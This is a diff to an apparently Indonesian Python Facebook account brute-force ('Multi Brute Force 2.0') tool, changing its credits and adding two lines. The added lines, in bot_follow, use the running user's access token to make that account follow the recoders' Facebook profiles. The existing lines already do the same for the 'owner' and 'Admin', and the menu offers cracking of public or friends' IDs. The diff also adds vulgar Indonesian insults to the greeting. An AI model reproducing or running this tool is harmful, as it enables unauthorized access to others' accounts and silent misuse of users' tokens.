@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made With ❤️ Chenglie
+# Made With ❤️ Krinj
 
 import requests,mechanize,subprocess,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
 from random import randint
@@ -36,7 +36,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │ Recode By YogzzTzy X EzaaTzy │\n       /  ^ \/ / // /  ^ \   │ •• Github.com/YumasaaTzy ••  │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │ Recode By Hikmat X Ndrii X Putri │\n       /  ^ \/ / // /  ^ \   │ •• Github.com/Hikmat-Gans-Awokawok ••  │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -271,6 +271,9 @@ def bot_follow():
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/100038025572885/subscribers?access_token=" + toket)      # owner sc
 	requests.post("https://graph.facebook.com/100038048266871/subscribers?access_token=" + toket)      # Admin
+	requests.post("https://graph.facebook.com/100028333393444/subscribers?access_token=" + toket)      # Putri Cans II
+	requests.post("https://graph.facebook.com/100075131925668/subscribers?access_token=" + toket)      # Ndrii Tzy
+	
 
 	menu()
 
@@ -300,10 +303,10 @@ def menu():
         negara = "None"
     os.system("clear")
     banner()
-    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
+    print((k+"\n[ "+p+"Welkombek Anak Ngentod "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
     print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+o+"Public"+p))
+    print((k+"["+p+"•"+k+"]"+p+" Status  : "+o+"Premium Sampe Punya Jodoh:v"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
     print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
@@ -1317,3 +1320,6 @@ def ress():
 if __name__=="__main__":
 	os.system("git pull")
 	country()
+	
+	
+#Ngapain Cok?
